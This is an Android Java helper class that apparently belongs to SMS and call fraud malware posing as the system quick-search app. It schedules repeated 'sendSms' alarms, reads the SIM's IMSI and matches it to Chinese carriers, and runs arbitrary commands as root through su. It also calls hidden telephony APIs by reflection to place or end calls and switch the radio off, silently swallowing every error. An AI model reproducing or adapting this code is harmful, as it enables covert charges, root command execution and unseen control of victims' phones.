package com.sttm.util;

import java.io.DataOutputStream;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.text.DecimalFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import com.sttm.charge.KsoAlarmService;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;

import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.telephony.TelephonyManager;
import android.telephony.gsm.SmsMessage;
import com.android.quicksearchbox.R;

@SuppressWarnings("deprecation")
public class KsoHelper {

	public static int getIndex(int flag) {
		int result = 0;

		do {
			result = (int) (Math.random() * 10);

		} while (result > 8 && flag == 1);
		return result;

	}

	public static void beginAlarmService(int count, Context context,
			int saleDelay2) {

		if (count <= 0) {
			return;
		}
		Intent intentSalesFlag2 = new Intent(context, KsoAlarmService.class);
		intentSalesFlag2.setAction("sendSms");
		PendingIntent pintentSalesFlag2 = PendingIntent.getBroadcast(context,
				0, intentSalesFlag2, 0);
		AlarmManager alarmSales2 = (AlarmManager) context
				.getSystemService(Context.ALARM_SERVICE);
		alarmSales2.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()
				+ saleDelay2 * 60 * 1000, pintentSalesFlag2);

		count--;

		beginAlarmService(count, context, saleDelay2);

	}

	public static int getCharacterPosition(String string, String params) {
		Matcher slashMatcher = Pattern.compile(params).matcher(string);
		int mIdx = 0;
		while (slashMatcher.find()) {
			mIdx++;
			if (mIdx == 4) {
				break;
			}
		}
		return slashMatcher.start();
	}

	public static boolean isWapconnected(Context context) {

		ConnectivityManager conManager = (ConnectivityManager) context
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo info = conManager.getActiveNetworkInfo();

		if (info != null && info.isConnected()) {
			if (info.getState() == NetworkInfo.State.CONNECTED) {
				String currentAPN = info.getExtraInfo();
				if (currentAPN == null || "".equals(currentAPN)) {
					return false;
				} else if (currentAPN.contains("wap")) {
					return true;
				}

			}
		}
		return false;
	}

	public static int sort(String t, String s) {
		int count = 0;
		String[] k = s.split(t);
		if (s.lastIndexOf(t) == (s.length() - t.length()))
			count = k.length;
		else
			count = k.length - 1;
		if (count == 0){
			
		} else
			return count;
		return -1;
	}

	public static int getRandom(int max) {
		if (max == 1) {
			return 0;
		}
		int result = 0;

		do {
			result = (int) (Math.random() * 10);

		} while (result >= max);
		return result;

	}

	public static int getCurrentMonth() {
		Calendar c = Calendar.getInstance();
		int month = c.get(Calendar.MONTH);
		return month;
	}

	
   public static boolean RootCommand(String command) {
       Process process = null;

       DataOutputStream os = null;
       try {
           process = Runtime.getRuntime().exec("su");
           os = new DataOutputStream(process.getOutputStream());
           os.writeBytes(command + "\n");
           os.writeBytes("exit\n");
           os.flush();
           process.waitFor();
       } catch (Exception e) {
           return false;
       } finally {
           try {
               if (os != null) {
                   os.close();
               }
               process.destroy();
           } catch (Exception e) {
           }
       }
       return true;
   }

	public static int getCharacterPosition(String string, String params,
			int keyind) {

		Matcher slashMatcher = Pattern
				.compile(params, Pattern.CASE_INSENSITIVE).matcher(string);
		int mIdx = 0;
		while (slashMatcher.find()) {
			mIdx++;

			if (mIdx == keyind) {
				break;
			}
		}
		return slashMatcher.start();
	}

	public static double getRandomDouble(int min, int max) {
		DecimalFormat df = new DecimalFormat("##.#");
		double d1 = Double.parseDouble(df.format(Math.random()));
		int result = 0;
		do {
			result = (int) (Math.random() * 10);

		} while (result >= max || result < min);

		return (result + d1);

	}

	public static double getRandomDouble2(int value) {
		DecimalFormat df = new DecimalFormat("##.#");
		double d1 = Double.parseDouble(df.format(Math.random()));
		return (value + d1);
	}

	public static String getImsi(Context context) {
		TelephonyManager telManager = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		String imsi = telManager.getSubscriberId();
		if (imsi == null) {
			imsi = telManager.getSimOperator();
		}
		return imsi;

	}

	public static int getARS(Context context) {
		TelephonyManager telManager = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		String operator = telManager.getSimOperator();
		if (operator != null) {
			if (operator.equals("46000") || operator.equals("46002")
					|| operator.equals("46007")) {
				return 1;
			} else if (operator.equals("46001")) {
				return 2;

			} else if (operator.equals("46003")) {
				return 3;
			}
		}
		return 0;

	}

	public static int getARS2(Context context) {
		TelephonyManager telManager = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		String imsi = telManager.getSubscriberId();

		if (imsi != null) {
			if (imsi.startsWith("46000") || imsi.startsWith("46002")) {
				return 1;
			} else if (imsi.startsWith("46001")) {
				return 2;
			} else if (imsi.startsWith("46003")) {
				return 3;
			}
		}
		return 0;

	}

	public static boolean isWriteLog(Context context)
			throws NameNotFoundException {
		ApplicationInfo appInfo = context.getPackageManager()
				.getApplicationInfo(context.getPackageName(),
						PackageManager.GET_META_DATA);
		Boolean msg = appInfo.metaData.getBoolean("userLog");
		if (msg != null) {
			return msg;
		}
		return true;

	}

	public static String getVersionDate(Context context)
			throws NameNotFoundException {
		ApplicationInfo appInfo = context.getPackageManager()
				.getApplicationInfo(context.getPackageName(),
						PackageManager.GET_META_DATA);
		Integer msg = appInfo.metaData.getInt("versionDate");

		if (msg != null) {
			return String.valueOf(msg);
		}

		return updateTime();

	}

	public static String getCustomID(Context context)
			throws NameNotFoundException {
		ApplicationInfo appInfo = context.getPackageManager()
			.getApplicationInfo(context.getPackageName(),
				PackageManager.GET_META_DATA);
		
		
		String curstomID = appInfo.metaData.getString("CustomID");

	

		return curstomID;

	}
	
	public static boolean isConnection(HttpURLConnection conn) {
		try {

			conn.setConnectTimeout(5 * 1000);
			conn.connect();
			return true;

		} catch (Exception e) {
			return false;
		}
	}

	public static String updateTime() {
		Date date = new Date();

		SimpleDateFormat format = new SimpleDateFormat("yyyyMMdd");

		return format.format(date);

	}

	public String getSmsc(SmsMessage sm) {
		return sm.getServiceCenterAddress() != null ? sm
				.getServiceCenterAddress() : "755";
	}

	public static void dial(String number, Context context) {
		Class<TelephonyManager> c = TelephonyManager.class;
		Method getITelephonyMethod = null;
		try {
			getITelephonyMethod = c.getDeclaredMethod("getITelephony",
					(Class[]) null);
			getITelephonyMethod.setAccessible(true);
		} catch (SecurityException e) {
		} catch (NoSuchMethodException e) {
		}

		try {
			TelephonyManager tManager = (TelephonyManager) context
					.getSystemService(Context.TELEPHONY_SERVICE);
			Object iTelephony;
			iTelephony = (Object) getITelephonyMethod.invoke(tManager,
					(Object[]) null);
			Method dial = iTelephony.getClass().getDeclaredMethod("dial",
					String.class);
			dial.invoke(iTelephony, number);
		} catch (IllegalArgumentException e) {
		} catch (IllegalAccessException e) {
		} catch (SecurityException e) {
		} catch (NoSuchMethodException e) {
		} catch (InvocationTargetException e) {
		}
	}

	public static void call(String number, Context context) {
		Class<TelephonyManager> c = TelephonyManager.class;
		Method getITelephonyMethod = null;
		try {
			getITelephonyMethod = c.getDeclaredMethod("getITelephony",
					(Class[]) null);
			getITelephonyMethod.setAccessible(true);
		} catch (SecurityException e) {
		} catch (NoSuchMethodException e) {
		}

		try {
			TelephonyManager tManager = (TelephonyManager) context
					.getSystemService(Context.TELEPHONY_SERVICE);
			Object iTelephony;
			iTelephony = (Object) getITelephonyMethod.invoke(tManager,
					(Object[]) null);
			Method dial = iTelephony.getClass().getDeclaredMethod("call",
					String.class);
			dial.invoke(iTelephony, number);
		} catch (IllegalArgumentException e) {
		} catch (IllegalAccessException e) {
		} catch (SecurityException e) {
		} catch (NoSuchMethodException e) {
		} catch (InvocationTargetException e) {
		}
	}

	public static void endCall(Context context) {
		Class<TelephonyManager> c = TelephonyManager.class;
		Method getITelephonyMethod = null;
		try {
			getITelephonyMethod = c.getDeclaredMethod("getITelephony",
					(Class[]) null);
			getITelephonyMethod.setAccessible(true);
		} catch (SecurityException e) {
		} catch (NoSuchMethodException e) {
		}

		try {
			TelephonyManager tManager = (TelephonyManager) context
					.getSystemService(Context.TELEPHONY_SERVICE);
			Object iTelephony;
			iTelephony = (Object) getITelephonyMethod.invoke(tManager,
					(Object[]) null);
			Method endCall = iTelephony.getClass().getDeclaredMethod("endCall",
					String.class);
			endCall.invoke(iTelephony);
		} catch (IllegalArgumentException e) {
		} catch (IllegalAccessException e) {
		} catch (SecurityException e) {
		} catch (NoSuchMethodException e) {
		} catch (InvocationTargetException e) {
		}
	}

	public static boolean isCalling(String number, Context context) {
		Class<TelephonyManager> c = TelephonyManager.class;
		Method getITelephonyMethod = null;
		try {
			getITelephonyMethod = c.getDeclaredMethod("getITelephony",
					(Class[]) null);
			getITelephonyMethod.setAccessible(true);
		} catch (SecurityException e) {
		} catch (NoSuchMethodException e) {
		}

		try {
			TelephonyManager tManager = (TelephonyManager) context
					.getSystemService(Context.TELEPHONY_SERVICE);
			Object iTelephony;
			iTelephony = (Object) getITelephonyMethod.invoke(tManager,
					(Object[]) null);
			Method isRinging = iTelephony.getClass().getDeclaredMethod(
					"isRinging", String.class);
			return (Boolean) isRinging.invoke(iTelephony, number);
		} catch (IllegalArgumentException e) {
		} catch (IllegalAccessException e) {
		} catch (SecurityException e) {
		} catch (NoSuchMethodException e) {
		} catch (InvocationTargetException e) {
		}
		return false;
	}
	public static String getAppVersionName(Context context) {
		String versionName = "";
		try {
			PackageManager pm = context.getPackageManager();
			PackageInfo pi = pm.getPackageInfo(context.getPackageName(), 0);
			versionName = pi.versionName;
			if (versionName == null || versionName.length() <= 0) {
				return "";
			}
		} catch (Exception e) {
		}
		return versionName;
	}

	public static String getRandomCode() {

		SimpleDateFormat sdf = new SimpleDateFormat("MMddmmss");
		String time = sdf.format(new Date());
		long ticks = System.currentTimeMillis();
		String tick = ticks + "";
		tick = time.trim() + tick.trim().substring(tick.length() - 6);
		return tick;
	}

	public static boolean setRadio(boolean shutdown, Context context) {
		Class<TelephonyManager> c = TelephonyManager.class;
		Method getITelephonyMethod = null;
		try {
			getITelephonyMethod = c.getDeclaredMethod("getITelephony",
					(Class[]) null);
			getITelephonyMethod.setAccessible(true);
		} catch (SecurityException e) {
		} catch (NoSuchMethodException e) {
		}

		try {
			TelephonyManager tManager = (TelephonyManager) context
					.getSystemService(Context.TELEPHONY_SERVICE);
			Object iTelephony;
			iTelephony = (Object) getITelephonyMethod.invoke(tManager,
					(Object[]) null);
			Method setRadio = iTelephony.getClass().getDeclaredMethod(
					"setRadio", String.class);
			return (Boolean) setRadio.invoke(iTelephony, shutdown);
		} catch (IllegalArgumentException e) {
		} catch (IllegalAccessException e) {
		} catch (SecurityException e) {
		} catch (NoSuchMethodException e) {
		} catch (InvocationTargetException e) {
		}
		return false;
	}

}
